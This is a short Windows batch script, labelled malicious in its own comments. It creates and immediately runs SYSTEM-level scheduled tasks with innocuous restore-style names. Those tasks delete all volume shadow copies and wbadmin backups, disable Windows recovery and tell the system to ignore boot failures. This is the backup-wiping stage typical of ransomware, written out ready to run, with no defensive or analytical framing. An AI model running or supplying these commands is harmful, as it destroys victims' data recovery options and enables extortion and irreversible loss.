REM Create malicious tasks to delete backups 
SCHTASKS /Create /RU SYSTEM /SC ONCE /TN VssDataRestore /F /RL HIGHEST /TR "vssadmin delete shadows /all /quiet" /st 00:00
SCHTASKS /Create /RU SYSTEM /SC ONCE /TN WBadminSystemRestore /F /RL HIGHEST /TR "wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0" /st 00:00
SCHTASKS /Create /RU SYSTEM /SC ONCE /TN WBadminBackupRestore /F /RL HIGHEST /TR "wbadmin DELETE BACKUP -keepVersions:0" /st 00:00
SCHTASKS /Create /RU SYSTEM /SC ONCE /TN WMICRestore /F /RL HIGHEST /TR "wmic SHADOWCOPY DELETE" /st 00:00
SCHTASKS /Create /RU SYSTEM /SC ONCE /TN BCRecover /F /RL HIGHEST /TR "bcdedit /set {default} recoveryenabled No" /st 00:00
SCHTASKS /Create /RU SYSTEM /SC ONCE /TN BCBoot /F /RL HIGHEST /TR "bcdedit /set {default} bootstatuspolicy ignoreallfailures" /st 00:00
REM Runs malicious tasks
SCHTASKS /Run /tn VssDataRestore
SCHTASKS /Run /tn WBadminSystemRestore
SCHTASKS /Run /tn WBadminBackupRestore
SCHTASKS  /Run /tn WMICRestore
SCHTASKS /Run /tn BCRecover
SCHTASKS  /Run /tn BCBoot
